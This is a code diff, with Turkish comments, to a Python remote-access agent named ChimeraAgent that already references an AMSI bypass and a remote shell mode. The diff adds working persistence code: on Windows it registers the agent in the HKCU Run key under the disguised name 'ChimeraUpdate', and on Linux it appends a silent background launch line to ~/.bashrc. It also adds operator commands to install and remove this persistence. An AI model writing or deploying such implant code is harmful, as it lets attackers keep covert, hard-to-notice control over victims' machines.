@@ -1339,6 +1339,121 @@ class ChimeraAgent:
             return f"[!] AMSI Bypass hatası: {str(e)}"
 
     # --------------------------------------------------------
+    # Persistence (Kalıcılık) Teknikleri
+    # --------------------------------------------------------
+    def install_persistence(self) -> str:
+        """Ajanı sistem başlangıcında çalışacak şekilde ayarlar.
+        
+        Windows: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+        Linux: .bashrc veya crontab
+        
+        Returns:
+            str: İşlem sonucu
+        """
+        try:
+            # Mevcut dosya yolunu al
+            current_exe = os.path.abspath(sys.argv[0])
+            
+            if sys.platform == "win32":
+                try:
+                    import winreg
+                    key = winreg.HKEY_CURRENT_USER
+                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    
+                    # Registry anahtarını aç
+                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
+                        winreg.SetValueEx(reg_key, "ChimeraUpdate", 0, winreg.REG_SZ, current_exe)
+                        
+                    return f"[+] Kalıcılık eklendi (Registry Run Key): {current_exe}"
+                except Exception as e:
+                    return f"[!] Registry hatası: {str(e)}"
+                    
+            else:
+                # Linux/Unix Persistence
+                try:
+                    # Yöntem 1: .bashrc (Kullanıcı login olduğunda çalışır)
+                    bashrc_path = os.path.expanduser("~/.bashrc")
+                    if os.path.exists(bashrc_path):
+                        # Zaten ekli mi kontrol et
+                        with open(bashrc_path, "r") as f:
+                            if "ChimeraAgent" in f.read():
+                                return "[!] Kalıcılık zaten .bashrc dosyasında mevcut."
+                        
+                        # Arka planda çalışacak şekilde ekle
+                        # (nohup ... &)
+                        cmd = f"\n# ChimeraAgent Persistence\nnohup python3 {current_exe} >/dev/null 2>&1 &\n"
+                        
+                        with open(bashrc_path, "a") as f:
+                            f.write(cmd)
+                            
+                        return f"[+] Kalıcılık eklendi (.bashrc): {current_exe}"
+                    else:
+                        # Yöntem 2: Crontab (Eğer .bashrc yoksa)
+                        # Not: Crontab manipülasyonu biraz daha karmaşık olabilir, şimdilik .bashrc yeterli.
+                        return "[!] .bashrc bulunamadı, kalıcılık eklenemedi."
+                        
+                except Exception as e:
+                    return f"[!] Linux Persistence hatası: {str(e)}"
+                    
+        except Exception as e:
+            return f"[!] Kalıcılık hatası: {str(e)}"
+
+    def remove_persistence(self) -> str:
+        """Kalıcılık ayarlarını temizler."""
+        try:
+            if sys.platform == "win32":
+                try:
+                    import winreg
+                    key = winreg.HKEY_CURRENT_USER
+                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    
+                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
+                        winreg.DeleteValue(reg_key, "ChimeraUpdate")
+                        
+                    return "[+] Kalıcılık kaldırıldı (Registry temizlendi)."
+                except FileNotFoundError:
+                    return "[!] Kalıcılık zaten yok veya bulunamadı."
+                except Exception as e:
+                    return f"[!] Registry temizleme hatası: {str(e)}"
+            else:
+                try:
+                    bashrc_path = os.path.expanduser("~/.bashrc")
+                    if os.path.exists(bashrc_path):
+                        with open(bashrc_path, "r") as f:
+                            lines = f.readlines()
+                        
+                        # ChimeraAgent içeren satırları filtrele
+                        new_lines = []
+                        removed = False
+                        skip = False
+                        
+                        for line in lines:
+                            if "# ChimeraAgent Persistence" in line:
+                                skip = True
+                                removed = True
+                                continue
+                            if skip and "ChimeraAgent" in line: # Payload satırı
+                                continue
+                            if skip and line.strip() == "": # Sonraki boş satır
+                                skip = False
+                                continue
+                            if not skip:
+                                new_lines.append(line)
+                                
+                        if removed:
+                            with open(bashrc_path, "w") as f:
+                                f.writelines(new_lines)
+                            return "[+] Kalıcılık kaldırıldı (.bashrc temizlendi)."
+                        else:
+                            return "[!] .bashrc içinde kalıcılık izi bulunamadı."
+                    else:
+                        return "[!] .bashrc dosyası bulunamadı."
+                except Exception as e:
+                    return f"[!] Linux temizleme hatası: {str(e)}"
+        except Exception as e:
+            return f"[!] Kalıcılık kaldırma hatası: {str(e)}"
+
+    # --------------------------------------------------------
     # Komut Çalıştırma
     # --------------------------------------------------------
     def shell_mode(self):
@@ -1496,6 +1611,13 @@ class ChimeraAgent:
         if cmd_lower == "amsi_bypass":
             return self.bypass_amsi()
             
+        # Persistence (Kalıcılık) Komutları
+        if cmd_lower == "persistence_install":
+            return self.install_persistence()
+            
+        if cmd_lower == "persistence_remove":
+            return self.remove_persistence()
+
         if cmd_lower.startswith("clipboard_set "):
             try:
                 # Komuttan metni ayır (clipboard_set <text>)
